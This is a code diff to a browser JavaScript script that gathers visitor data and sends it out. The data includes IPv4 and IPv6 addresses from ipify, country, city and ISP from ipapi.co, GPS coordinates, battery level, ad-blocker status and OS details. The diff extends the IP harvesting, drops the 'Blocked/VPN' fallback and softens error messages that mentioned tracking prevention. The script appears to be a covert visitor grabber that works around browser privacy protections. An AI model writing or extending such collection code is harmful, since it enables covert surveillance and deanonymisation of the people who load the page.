@@ -36,20 +36,40 @@ function getGPU() {
 }
 
 async function getIPData() {
+    let ipv4 = "Not Detected";
+    let ipv6 = "Not Detected";
+    let geo = { country: "Unavailable", city: "", org: "Unavailable" };
+
     try {
-        const response = await fetch("https://ipapi.co/json/", { timeout: 3000 });
-        if (!response.ok) throw new Error("Blocked by browser");
-        const data = await response.json();
-        return { 
-            ip: data.ip || "Unavailable", 
-            country: data.country_name || "Unavailable", 
-            city: data.city || "", 
-            org: data.org || "Unavailable" 
-        };
+        const res4 = await fetch("https://api.ipify.org?format=json").catch(() => null);
+        if (res4) {
+            const data4 = await res4.json();
+            ipv4 = data4.ip;
+        }
+
+        const res6 = await fetch("https://api6.ipify.org?format=json").catch(() => null);
+        if (res6) {
+            const data6 = await res6.json();
+            ipv6 = data6.ip;
+        }
+
+        const resGeo = await fetch("https://ipapi.co/json/").catch(() => null);
+        if (resGeo) {
+            const dataGeo = await resGeo.json();
+            geo.country = dataGeo.country_name || "Unavailable";
+            geo.city = dataGeo.city || "";
+            geo.org = dataGeo.org || "Unavailable";
+        }
     } catch (error) {
-        console.warn("IP Fetch blocked by browser tracking prevention.");
-        return { ip: "Blocked/VPN", country: "Blocked", city: "", org: "Blocked" };
+        console.warn("IP collection partially blocked.");
     }
+
+    return {
+        combinedIP: `IPv4: ${ipv4} | IPv6: ${ipv6}`,
+        country: geo.country,
+        city: geo.city,
+        org: geo.org
+    };
 }
 
 async function getGPS() {
@@ -99,13 +119,13 @@ async function collect() {
     const ipData = await getIPData();
     const gps = await getGPS();
     const battery = await getBatteryInfo();
-    const adBlockStatus = await checkAdBlocker(); // FIX: added await
+    const adBlockStatus = await checkAdBlocker();
     const currentOS = getOS();
     const androidVer = detectAndroidVersion();
 
     return {
         TIME: new Date().toString(),
-        IP: ipData.ip,
+        IP_ADDRESSES: ipData.combinedIP, // Now shows both
         LOCATION: `${ipData.country} ${ipData.city}`.trim(),
         ISP: ipData.org,
         GPS_LATITUDE: gps.lat,
@@ -139,7 +159,7 @@ async function sendData() {
             console.log("Submission successful");
         }
     } catch (e) {
-        console.error("Transmission failed. Possible adblocker or network error.");
+        console.error("Transmission failed.");
     }
 }
 
